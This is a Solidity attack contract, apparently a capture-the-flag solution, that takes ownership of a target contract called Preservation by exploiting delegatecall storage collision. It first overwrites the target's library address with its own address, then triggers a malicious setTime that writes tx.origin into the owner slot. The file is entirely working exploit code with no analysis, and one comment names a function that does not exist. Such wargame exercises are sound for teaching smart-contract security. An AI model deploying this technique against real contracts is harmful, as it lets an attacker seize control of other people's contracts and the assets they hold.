// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttacker {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    IPreservation public preservation;

    constructor(address _preservation) {
        preservation = IPreservation(_preservation);
    }

    function attack() public {
        // override address of lib
        preservation.setFirstTime(uint256(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        preservation.setFirstTime(1);
    }

    function setTime(uint256 _timeStamp) public {
        owner = tx.origin;
    }
}

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
}
